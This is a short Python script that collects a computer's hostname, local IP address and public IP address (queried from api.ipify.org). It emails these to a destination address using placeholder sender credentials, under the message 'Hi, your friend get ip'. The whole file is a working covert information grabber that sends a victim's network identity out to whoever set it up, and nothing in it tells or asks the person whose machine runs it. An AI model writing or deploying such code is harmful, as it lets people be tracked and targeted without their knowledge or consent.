import socket
from send_email import send_message
from requests import get


def get_hosts():
	host_name = socket.gethostname()
	local_ip = socket.gethostbyname(host_name)

	global_ip = get('http://api.ipify.org').text

	return f"Hi, your friend get ip:\nhost: {host_name}\nlocal: {local_ip}\nglobal: {global_ip}"


def main():

	email = "your email"
	password = "pass"
	dest_email = "aim email"

	# header
	subject = "Hello, man"

	text = "text"

	mess = get_hosts()
	message = f"From: {email}\nTo: {dest_email}\nSubject: {subject}\n\n{mess}"


	send_message(email=email, password=password, dest_email=dest_email, message=message)



if __name__ == "__main__":
	main()
